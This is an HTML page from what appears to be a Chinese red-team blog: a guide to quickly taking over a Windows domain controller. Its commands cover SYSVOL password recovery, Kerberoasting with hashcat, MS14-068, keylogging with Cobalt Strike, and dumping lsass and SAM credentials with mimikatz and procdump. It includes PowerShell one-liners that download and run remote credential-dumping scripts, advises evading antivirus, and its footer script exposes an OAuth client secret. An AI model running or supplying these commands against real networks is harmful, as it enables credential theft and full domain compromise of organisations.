@@ -1,0 +1,585 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>内网渗透: 基础域渗透快速获取域控权限 - loecho</title>
+<link rel="shortcut icon" href="https://1oecho.github.io/favicon.ico">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.2.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css">
+<link rel="stylesheet" href="https://1oecho.github.io/media/css/tailwind.css">
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="内网渗透: 基础域渗透快速获取域控权限 - loecho - Atom Feed" href="https://1oecho.github.io/atom.xml">
+
+    
+
+  <meta name="description" content="
+0x01 最终目标
+
+域控权限（域控目的时是控制运维机）
+运维机（运维机目的是内网核心）
+内网核心以及核心业务段
+
+0x02 基本方法：
+[+] 常用快速获取域控权限的方法
+[+] 查找SYSVOL和组策略首选项中保存的密码 
+
+参考链接..." />
+  <meta property="og:title" content="内网渗透: 基础域渗透快速获取域控权限 - loecho">
+  <meta property="og:description" content="
+0x01 最终目标
+
+域控权限（域控目的时是控制运维机）
+运维机（运维机目的是内网核心）
+内网核心以及核心业务段
+
+0x02 基本方法：
+[+] 常用快速获取域控权限的方法
+[+] 查找SYSVOL和组策略首选项中保存的密码 
+
+参考链接..." />
+  <meta property="og:type" content="articles">
+  <meta property="og:url" content="https://1oecho.github.io/Net-05/" />
+  <meta property="og:image" content="https://1oecho.github.io/images/avatar.png">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:width" content="1200">
+  <meta name="twitter:title" content="内网渗透: 基础域渗透快速获取域控权限 - loecho">
+  <meta name="twitter:description" content="
+0x01 最终目标
+
+域控权限（域控目的时是控制运维机）
+运维机（运维机目的是内网核心）
+内网核心以及核心业务段
+
+0x02 基本方法：
+[+] 常用快速获取域控权限的方法
+[+] 查找SYSVOL和组策略首选项中保存的密码 
+
+参考链接...">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://1oecho.github.io/Net-05/">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+ 
+  
+    <link rel="stylesheet" href="https://1oecho.github.io/media/css/prism-synthwave84.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+  
+</head>
+
+<body>
+  <div class="antialiased flex flex-col min-h-screen" id="app">
+    <a href="https://1oecho.github.io" class="fixed top-0 left-0 mt-4 bg-black text-white dark:text-gray-700 dark:bg-yellow-50 dark:hover:bg-black dark:hover:text-white inline-flex p-2 pl-8 hover:text-gray-700 hover:bg-yellow-50 font-bold z-10 transition-fast animated fadeInLeft">
+      loecho
+    </a>
+    <div class="max-w-4xl w-full mx-auto">
+      <div class="shadow-box bg-white dark:bg-gray-600 rounded-lg pt-32 md:pt-64 px-4 md:px-8 pb-8 animated fadeIn mb-8">
+        <h1 class="text-5xl font-semibold leading-normal pb-8 mb-8 border-b-8 border-gray-700">
+          内网渗透: 基础域渗透快速获取域控权限
+        </h1>
+        
+        <div class="mb-8 flex flex-wrap">
+          <div class="text-gray-400 text-sm mr-4">2020-11-11 · 7 min read</div>
+          
+        </div>
+        <div class="markdown mb-8" v-pre>
+          <figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111090311.png" alt="image-20201111090310932" loading="lazy"></figure>
+<h2 id="0x01-最终目标">0x01 最终目标</h2>
+<ul>
+<li>域控权限（域控目的时是控制运维机）</li>
+<li>运维机（运维机目的是内网核心）</li>
+<li>内网核心以及核心业务段</li>
+</ul>
+<h2 id="0x02-基本方法">0x02 基本方法：</h2>
+<h3 id="常用快速获取域控权限的方法">[+] 常用快速获取域控权限的方法</h3>
+<h3 id="font-colorred-查找sysvol和组策略首选项中保存的密码-font"><font color=REd>[+] 查找SYSVOL和组策略首选项中保存的密码 </font></h3>
+<ul>
+<li>参考链接:  <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">域渗透——利用SYSVOL还原组策略中保存的密码</a></li>
+</ul>
+<pre><code class="language-cmd"># 在域中，存在一个默认的共享路径：
+
+# \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\
+
+# 所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等
+
+# 测试主机所在域为 de1ay.com，可访问共享文件夹\\de1ay.com\SYSVOL\de1ay.com
+
+# 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密,获取到密码信息,通过Powershell脚本进行解密
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111105637.png" alt="image-20201111105637777" loading="lazy"></figure>
+<ul>
+<li><strong>常见存在敏感信息的XML文件：</strong></li>
+</ul>
+<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
+<ul>
+<li>
+<p>Services\Services.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</p>
+</li>
+<li>
+<p>ScheduledTasks\ScheduledTasks.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</p>
+</li>
+<li>
+<p>Printers\Printers.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</p>
+</li>
+<li>
+<p>Drives\Drives.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</p>
+</li>
+<li>
+<p>DataSources\DataSources.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</p>
+</li>
+</ul>
+<h3 id="font-colorred-通过-kerberos-tgs-服务访问票据-离线爆破-font"><font color=REd>[+] 通过 Kerberos TGS [服务访问票据] 离线爆破 </font></h3>
+<ul>
+<li>参考链接:  <a href="https://whale3070.github.io/windowsdomain/2020/05/04/09-x/">Kerberoasting服务票据离线爆破密码</a></li>
+</ul>
+<pre><code class="language-cmd"># spn“服务主体名称”是什么？
+
+# 服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。
+# 这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。
+</code></pre>
+<h4 id="基本方法">基本方法：</h4>
+<ol>
+<li>通过<code>Mimikatz</code>导出票据TGS,文件后缀为<code>Kirbi</code>,命令：<strong>mimikatz.exe &quot;kerberos::list /export&quot; exit</strong>
+<ul>
+<li>关键点：实际环境MimiKatz进行免杀处理</li>
+</ul>
+</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111100620.png" alt="image-20201111100620522" loading="lazy"></figure>
+<ol start="2">
+<li>离线爆破方式：</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111142451.png" alt="image-20201111142451614" loading="lazy"></figure>
+<pre><code class="language-cmd"># (1) 通过tgsrepcrack.py工具,进行服务票据爆破
+# cmd： python2 tgsrepcrack.py password.txt loecho.Kirbi
+
+# (2) 通过kirbi2john.py将导出的loecho.kirbi转换为hashcat可以破解的格式，使用hashcat破解
+# cmd： 
+#      1. python2 kirbi2john.py python /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi &gt; output.txt （提取Kerberos tickets,结果output.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]）
+
+#	   2. 通过HashCat进行爆破：
+#	   cmd： hashcat -m 13100 output.txt pasword.txt --force
+
+# (3) 通过Invoke-Kerberoast（https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)导出票据，hashcat破解 
+
+# 执行没有任何结果
+# import-module .\Invoke-Kerberoast.ps1
+# Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
+
+# 提示没有AdminCount参数
+# Invoke-Kerberoast -OutputFormat Hashcat | fl
+# Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+</code></pre>
+<h3 id="font-colorred-键盘记录屏幕截图获取关键的敏感记录font"><font color=REd>[+] 键盘记录/屏幕截图获取关键的敏感记录</font></h3>
+<h4 id="基本方法-2">基本方法：</h4>
+<p><strong>关键点： 实际使用中,免杀处理等一系列操作</strong></p>
+<ol>
+<li><strong>Cobalt Strike</strong> 键盘记录，记录选择运维人员/管理人员的主机进行记录</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111145249.png" alt="image-20201111145249838" loading="lazy"></figure>
+<ul>
+<li>屏幕截图</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111145804.png" alt="image-20201111145803950" loading="lazy"></figure>
+<h3 id="font-colorred-密码搜集-比如从ldap中搜集各类密码从已控主机搜各类软件存储的密码font"><font color=REd>[+]  密码搜集 比如从LDAP中搜集各类密码/从已控主机搜各类软件存储的密码</font></h3>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111150353.png" alt="image-20201111150353759" loading="lazy"></figure>
+<h3 id="font-colorredms14-68-kerberos-协议漏洞利用-漏洞太老实际中遇到较少font"><font color=REd>[+]ms14-68 Kerberos 协议漏洞利用 [漏洞太老，实际中遇到较少]</font></h3>
+<h4 id="1-pykek">1、PyKEK</h4>
+<p>最先公开的利用方法是Sylvain Monné用Python实现的PyKEK</p>
+<p>准备条件：</p>
+<ul>
+<li>域用户及其口令</li>
+<li>域用户对应sid</li>
+<li>域控地址</li>
+<li>Win7及以上系统</li>
+</ul>
+<blockquote>
+<p><strong>Tips：</strong></p>
+<ol>
+<li>操作系统要求Win7及以上，这是因为XP不支持导入Ticket</li>
+<li>攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击</li>
+<li>将Python脚本转成exe即可在任意一台Windows主机使用</li>
+</ol>
+</blockquote>
+<p>漏洞利用的步骤为：</p>
+<ul>
+<li>如果漏洞触发成功，会生成.ccache文件</li>
+<li>通过klist purge先清除内存中的Ticket</li>
+<li>使用mimikatz的ptc功能将.ccache导入到内存</li>
+<li>通过klist查看导入的Ticket</li>
+<li>使用net use 连接域控</li>
+</ul>
+<blockquote>
+<p><strong>Tips：</strong></p>
+<ol>
+<li>如果不先清除内存中的Ticket直接导入，有可能会失败</li>
+<li>连接域控要使用域控地址，不要用IP</li>
+</ol>
+</blockquote>
+<h4 id="2-kekeo">2、kekeo</h4>
+<p>Benjamin DELPY用c实现了MS14-068的利用工具，更简单高效。</p>
+<p>因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据</p>
+<p>kekeo的快捷用法仅需要以下参数：</p>
+<ul>
+<li>域用户及其口令</li>
+<li>域控地址</li>
+</ul>
+<h4 id="3-通过提权exp直接从普通域用户提权到域管理员用户">3. 通过提权exp，直接从普通域用户提权到域管理员用户</h4>
+<h4 id="font-colorred借助各类基础服务漏洞进行密码hash抓取font"><font color=REd>[+]借助各类基础服务漏洞进行密码Hash抓取</font></h4>
+<ul>
+<li>参考链接:参考链接:  <a href="https://xz.aliyun.com/t/7278">Windows本地hashdump备忘录</a></li>
+<li>项目推荐: <code>https://github.com/TheKingOfDuck/hashdump</code></li>
+</ul>
+<h4 id="基本原理">基本原理：</h4>
+<p>通过各种方式，不管是<code>在线</code>还是<code>离线</code>基本原理都是对Windows的Lsass.exe进行内存读取/或者是通过读取SAM数据库,提取出里面存储的用户Hash</p>
+<h3 id="工具直接dump">[+] 工具直接Dump：</h3>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>（实际环境处理特征/重新编译）<strong>运行条件</strong>: 高权限</li>
+</ul>
+<pre><code class="language-cmd"># 编译有俩个版本，根据目标环境不同选用不同版本
+
+# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111152642.png" alt="image-20201111152641976" loading="lazy"></figure>
+<ul>
+<li><code>QuarksPwDump</code> <strong>运行条件</strong>: 高权限</li>
+</ul>
+<p><strong><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111154333.png" alt="image-20201111154333723" loading="lazy"></strong></p>
+<ul>
+<li><code>wce.exe -w</code>  <strong>运行条件</strong>: 高权限</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111154808.png" alt="image-20201111154807944" loading="lazy"></figure>
+<h4 id="dump内存文件导出sam数据库后续通过工具解密">[+] Dump内存文件/导出SAM数据库，后续通过工具解密</h4>
+<ul>
+<li><strong>REG+Mimikatz</strong></li>
+</ul>
+<pre><code class="language-cmd">reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive # 导出文件
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111160102.png" alt="image-20201111160102796" loading="lazy"></figure>
+<pre><code class="language-cmd"># 1.解密文件，导入SAMInside，复制NT-Hash进行碰撞/查询
+
+# 2.找自己测试机，通过Mimikatz离线读取，进行数据读取
+
+lsadump::sam /sam:sam.hive /system:system.hive
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111160917.png" alt="image-20201111160917486" loading="lazy"></figure>
+<ul>
+<li><strong>Procdump(微软官方程序)+Mimikatz</strong></li>
+</ul>
+<pre><code class="language-cmd"># Procdump.exe -accepteula -ma lsass.exe lsess.dmp  # 导出lsass内存文件
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111161602.png" alt="image-20201111161602368" loading="lazy"></figure>
+<pre><code class="language-cmd"># 通过Mimikatz进行载入/读取：
+
+# minidump lsass.dmp    # 切换文件
+
+# sekurlsa::logonPasswords full  # 导出hash/密码
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111161956.png" alt="image-20201111161955727" loading="lazy"></figure>
+<ul>
+<li><strong>无文件DumpHash,远程加载Powershell脚本</strong></li>
+</ul>
+<pre><code class="language-powershell">powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
+</code></pre>
+<pre><code class="language-powershell">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
+</code></pre>
+<ul>
+<li>尝试根据之前搜集汇总的密码/字典进行精确爆破SMB</li>
+</ul>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+        
+          <div id="gitalk-container"></div>
+        
+
+        
+      
+
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  Red Team@loecho /CTFer@Web
+</footer>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E6%9C%80%E7%BB%88%E7%9B%AE%E6%A0%87">0x01 最终目标</a></li>
+<li><a href="#0x02-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95">0x02 基本方法：</a>
+<ul>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%9A%84%E6%96%B9%E6%B3%95">[+] 常用快速获取域控权限的方法</a></li>
+<li><a href="#font-colorred-%E6%9F%A5%E6%89%BEsysvol%E5%92%8C%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81-font"><font color=REd>[+] 查找SYSVOL和组策略首选项中保存的密码 </font></a></li>
+<li><a href="#font-colorred-%E9%80%9A%E8%BF%87-kerberos-tgs-%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE%E7%A5%A8%E6%8D%AE-%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4-font"><font color=REd>[+] 通过 Kerberos TGS [服务访问票据] 离线爆破 </font></a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95">基本方法：</a></li>
+</ul>
+</li>
+<li><a href="#font-colorred-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E7%9A%84%E6%95%8F%E6%84%9F%E8%AE%B0%E5%BD%95font"><font color=REd>[+] 键盘记录/屏幕截图获取关键的敏感记录</font></a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95-2">基本方法：</a></li>
+</ul>
+</li>
+<li><a href="#font-colorred-%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86-%E6%AF%94%E5%A6%82%E4%BB%8Eldap%E4%B8%AD%E6%90%9C%E9%9B%86%E5%90%84%E7%B1%BB%E5%AF%86%E7%A0%81%E4%BB%8E%E5%B7%B2%E6%8E%A7%E4%B8%BB%E6%9C%BA%E6%90%9C%E5%90%84%E7%B1%BB%E8%BD%AF%E4%BB%B6%E5%AD%98%E5%82%A8%E7%9A%84%E5%AF%86%E7%A0%81font"><font color=REd>[+]  密码搜集 比如从LDAP中搜集各类密码/从已控主机搜各类软件存储的密码</font></a></li>
+<li><a href="#font-colorredms14-68-kerberos-%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E5%A4%AA%E8%80%81%E5%AE%9E%E9%99%85%E4%B8%AD%E9%81%87%E5%88%B0%E8%BE%83%E5%B0%91font"><font color=REd>[+]ms14-68 Kerberos 协议漏洞利用 [漏洞太老，实际中遇到较少]</font></a>
+<ul>
+<li><a href="#1-pykek">1、PyKEK</a></li>
+<li><a href="#2-kekeo">2、kekeo</a></li>
+<li><a href="#3-%E9%80%9A%E8%BF%87%E6%8F%90%E6%9D%83exp%E7%9B%B4%E6%8E%A5%E4%BB%8E%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7">3. 通过提权exp，直接从普通域用户提权到域管理员用户</a></li>
+<li><a href="#font-colorred%E5%80%9F%E5%8A%A9%E5%90%84%E7%B1%BB%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81hash%E6%8A%93%E5%8F%96font"><font color=REd>[+]借助各类基础服务漏洞进行密码Hash抓取</font></a></li>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">基本原理：</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B7%A5%E5%85%B7%E7%9B%B4%E6%8E%A5dump">[+] 工具直接Dump：</a>
+<ul>
+<li><a href="#dump%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BAsam%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8E%E7%BB%AD%E9%80%9A%E8%BF%87%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%AF%86">[+] Dump内存文件/导出SAM数据库，后续通过工具解密</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://1oecho.github.io/media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://1oecho.github.io/media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+  
+    
+      <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script type="application/javascript" src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="application/javascript">
+
+  var gitalk = new Gitalk({
+    clientID: '61442cf87c4266a18189',
+    clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+    repo: 'loecho',
+    owner: '1oecho',
+    admin: ['1oecho'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+    
+  
+</body>
+
+</html>
